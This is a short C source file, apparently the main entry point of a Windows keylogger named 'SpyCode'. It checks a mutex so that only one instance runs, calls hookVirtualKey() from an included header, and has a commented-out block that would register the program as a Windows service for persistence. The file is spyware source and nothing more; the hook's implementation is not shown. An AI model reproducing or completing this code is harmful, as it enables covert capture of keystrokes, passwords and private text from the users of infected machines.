#include "hook.h"

HANDLE hMutex = NULL;

int main(){
	/*
	SERVICE_TABLE_ENTRY ServiceTable[2];  
    ServiceTable[0].lpServiceName="SpyCode";  
    ServiceTable[0].lpServiceProc=(LPSERVICE_MAIN_FUNCTION)ServiceMain;  
    ServiceTable[1].lpServiceName=NULL;  
    ServiceTable[1].lpServiceProc=NULL;  
    StartServiceCtrlDispatcher(ServiceTable);  
	*/
	//使用互斥量来检测系统只创建一个程序实例
	hMutex = CreateMutex(NULL, FALSE, "SpyCode");
	if (hMutex)
    {
        if(ERROR_ALREADY_EXISTS != GetLastError()){
			hookVirtualKey();
		}
		else{
			printf("Program's instance is already running\n"); 
		}
	}
//	hookVirtualKey();
	return 0;
}